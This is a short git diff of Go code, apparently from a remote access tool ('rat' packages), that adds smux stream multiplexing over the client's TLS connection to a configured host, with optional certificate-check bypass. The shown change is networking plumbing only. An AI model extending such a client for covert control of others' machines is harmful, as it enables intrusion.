@@ -11,6 +11,8 @@ import (
 	"rat/shared/installpath"
 	"rat/shared/network"
 	"time"
+
+	"github.com/xtaci/smux"
 )
 
 var conn *tls.Conn
@@ -55,11 +57,22 @@ func start(config shared.BinaryConfig) {
 		conn, err = tls.Dial("tcp", host, &tls.Config{
 			InsecureSkipVerify: Config.InvalidSSL,
 		})
+		session, err := smux.Client(conn, nil)
+		if err != nil {
+
+			panic(err)
+		}
+		control, err := session.AcceptStream()
+		if err != nil {
+			panic(err)
+		}
+		fmt.Println("stream opened")
 
 		con := Connection{
-			Conn:   conn,
-			Writer: network.Writer{conn},
-			Reader: network.Reader{conn},
+			Conn:    session,
+			control: control,
+			Writer:  network.Writer{control},
+			Reader:  network.Reader{control},
 		}
 
 		if err != nil {
